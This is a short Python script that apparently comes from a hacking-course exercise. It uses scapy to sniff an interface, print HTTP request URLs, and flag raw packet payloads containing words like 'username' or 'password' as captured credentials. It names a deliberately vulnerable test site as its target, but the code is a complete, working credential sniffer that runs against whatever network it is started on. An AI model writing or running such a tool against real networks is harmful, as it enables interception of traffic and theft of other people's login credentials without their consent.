#!/usr/bin/env python

"""
It reads all traffic flowing through given interface  sniff("eth0")
Start the app and generate some traffic by calling a webpage to see traffic capture
It captures user logging data from not secured (http) webpages like:  http://testphp.vulnweb.com/login.php
"""


import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    # iface: hw interface,  store: store data in memory, prn: call back function


def get_url(packet):
    # detect url of called webpage
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):

        load = str(packet[scapy.Raw].load)
        print(load + " -------------- /n")

        keywords = ["username", "user", "login", "password", "pass"]
        for _ in keywords:
            if _ in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(" HTTP Request >> " + url.decode())

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n Possible username/password > " + login_info + "\n\n")


sniff("eth0")
